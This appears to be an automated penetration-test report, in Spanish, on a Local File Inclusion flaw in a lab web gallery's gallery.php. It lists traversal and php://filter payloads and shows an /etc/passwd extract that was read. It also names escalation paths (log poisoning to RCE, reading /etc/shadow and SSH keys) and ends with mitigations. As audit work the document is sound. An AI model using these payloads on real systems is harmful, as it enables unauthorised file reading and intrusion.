# Informe de Auditoría LFI — Galería de Arte Virtual

Fecha: 2026-04-18T08:56:09Z
Objetivo: http://web.dev.local:8081

Resumen ejecutivo
-----------------
Se identificó y explotó una vulnerabilidad de Local File Inclusion (LFI) en el parámetro `page` de `gallery.php`.
Mediante traversal directo se obtuvo lectura de ficheros del sistema (ej. /etc/passwd). Impacto: divulgación de información sensible del sistema y potencial escalado a RCE mediante técnicas adicionales (log poisoning, lectura de /proc/self/environ, extracción de claves privadas si presentes).

Detalles técnicos
-----------------
Host objetivo: http://web.dev.local:8081
Endpoint vulnerable: /gallery.php?page=
Parámetro vulnerable: page (uso directo en include sin saneamiento)
Servidor: Apache/2.4.65 (Debian)
PHP: 8.1.33 (X-Powered-By header)

Comandos y metodología (ejecución realizada desde entorno Kali-like)
----------------------------------------------------------------------
1) Reconocimiento inicial
- curl -I http://web.dev.local:8081
- curl -s http://web.dev.local:8081 -o /tmp/root.html

2) Pruebas manuales y script de fuzzing utilizado
Se ejecutó un script con múltiples payloads dirigidos al parámetro `page`:

Base URL usada:
http://web.dev.local:8081/gallery.php?page=

Payloads probados (lista representativa):
- ../../../../../../etc/passwd
- ../../../../../../etc/passwd%00
- php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd
- php://filter/read=convert.base64-encode/resource=gallery.php
- ../../../../../../proc/self/environ
- /etc/hosts
- .env
- /var/www/html/.git/config
- /var/www/html/config.php.bak
- ../../../../../../var/www/html/config.php

Script usado (resumen):
- Se creó /tmp/lfi_tests.sh que itera sobre los payloads y guarda la salida en /tmp/lfi_results.txt
- Curl usado: curl -s "${base}${p}"

Prueba de lectura exitosa (/etc/passwd)
-------------------------------------
Payload exitoso:
http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd

Ejemplo de salida (extracto de /etc/passwd obtenido):
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

También se probó el wrapper php://filter para base64-encode; la página devolvió texto base64 embebido después del contenido HTML cuando se intentó:
php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd

La aplicación genera mensajes de error que revelan la ruta absoluta del archivo vulnerable cuando se intentó incluir /proc/self/environ (permiso denegado), por ejemplo:
Warning: include(/proc/515/environ): Failed to open stream: Permission denied in /var/www/html/gallery.php on line 104

Confirmación de vulnerabilidad
------------------------------
- Resultado: se mostró el contenido de /etc/passwd dentro de la página renderizada → confirmación de LFI.
- La inclusión se realiza usando la ruta proporcionada por el parámetro `page` sin saneamiento/validación y sin whitelisting.

Explotación y alcance (marcado como explotado)
----------------------------------------------
- Leyendo /etc/passwd se confirma acceso a ficheros sensibles del sistema (VULN_EXPLOITED = true).
- Posibles siguientes pasos (no ejecutados automáticamente en esta fase, listados como opciones de explotación):
  * Intentar lectura de /etc/shadow (normalmente protegido) buscando elevación de sensibilidad.
  * Usar log poisoning (modificar logs de acceso si web server escribe valores controlables) para conseguir RCE mediante include de logs que contienen código PHP.
  * Buscar y extraer claves privadas (p. ej. /home/www-data/.ssh/id_rsa) si los permisos lo permiten.
  * Usar php://filter para obtener código fuente de ficheros .php y descubrir credenciales en config.php, .env, etc.

Pruebas y evidencia
-------------------
- Headers iniciales:
  * Server: Apache/2.4.65 (Debian)
  * X-Powered-By: PHP/8.1.33
- Payload que devolvió /etc/passwd: ../../../../../../etc/passwd
- Extracto de /etc/passwd incluido arriba (ver sección correspondiente).
- Mensajes de PHP que muestran rutas absolutas al probar /proc/self/environ.

Impacto
-------
- Divulgación de información sobre usuarios del sistema (incluyendo cuenta www-data usada por el servidor web).
- Facilita técnicas posteriores para escalado a RCE (log poisoning, lectura de archivos con credenciales, uso de wrappers php:// para extracción).
- En un entorno real, extracción de /etc/shadow o de claves SSH podría permitir acceso persistente y control total.

Recomendaciones de mitigación
-----------------------------
1) Evitar incluir archivos directamente a partir de entradas del usuario. Implementar una whitelist de páginas permitidas.
2) Normalizar y sanear el parámetro `page` (permitir solo identificadores conocidos, no rutas).
3) Desactivar display_errors en producción (php.ini display_errors = Off) para evitar path disclosure.
4) Ejecutar la aplicación con el mínimo privilegio posible y restringir el acceso a ficheros sensibles (SELinux/AppArmor, permisos de fichero adecuados).
5) Considerar el uso de chroot o contenedores para aislar el árbol de ficheros del servidor web.
6) Revisar el código para eliminar includes dinámicos sin control.

Ficheros y comandos guardados
----------------------------
- /tmp/lfi_tests.sh (script usado para automatizar pruebas)
- /tmp/lfi_results.txt (salidas de las pruebas)

Conclusión
----------
Vulnerabilidad LFI confirmada y explotada con éxito para leer archivos del sistema (p.ej. /etc/passwd). Se recomienda corrección urgente de la inclusión dinámica y mitigaciones adicionales listadas.

Informe generado por: Auditoría automatizada (Kali-like) — output guardado en este fichero.

